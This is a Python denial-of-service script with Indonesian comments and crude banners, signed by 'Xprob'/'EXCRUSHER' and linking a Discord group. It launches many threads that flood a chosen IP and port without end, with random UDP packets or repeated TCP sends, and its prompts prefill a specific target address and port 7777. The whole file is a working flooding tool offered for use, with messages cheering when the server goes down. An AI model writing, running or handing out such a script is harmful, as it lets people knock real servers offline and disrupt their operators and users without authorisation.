#!/usr/bin/env python3
#Semoga Tembus Ya Dek
#Ddos by EXCRUSHER
#Join My T3Am : https://discord.gg/Du6kz6NCeX
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by Xprob")
print("Kalau Mau Pakek Ganteng Dulu")
print("Mau rename? Pm Xprob ")
ip = str(input(" DdosAttackbyXprob | Ip:51.79.250.158"))
port = int(input(" DdosAttackByXprob | Port:7777"))
choice = str(input(" DdosAttackByXprob | Gas Gak Ni?(y/n):y"))
times = int(input(" DdosAttackByXprob | Packets:100"))
threads = int(input(" DdosAttackByXprob | Threads:100"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Xprob9999 |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xprob nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
